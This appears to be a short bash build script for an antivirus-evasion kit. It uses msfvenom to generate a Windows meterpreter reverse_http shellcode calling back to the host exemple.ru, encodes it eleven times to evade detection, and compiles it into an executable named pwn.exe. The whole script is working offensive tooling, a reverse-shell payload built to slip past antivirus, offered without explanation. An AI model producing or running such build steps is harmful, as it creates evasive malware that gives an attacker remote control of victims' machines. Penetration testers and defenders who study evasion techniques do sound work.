#!/bin/bash          
#
msfvenom -p windows/meterpreter/reverse_http \
                    lhost=exemple.ru \
                    lport=80 \
                    luri=exemple.php \
                    -e x86/shikata_ga_nai -i 11 \
                    -f c -a x86 --platform Windows > sc.txt
#./format.sh sc.txt > scclean.txt && rm sc.txt
#cat sc.txt >> defs.h
#echo "" > scclean.txt
./make_avet -f sc.txt -F -p
i686-w64-mingw32-gcc -o pwn.exe avet.c
rm sc.txt && echo "" > defs.h
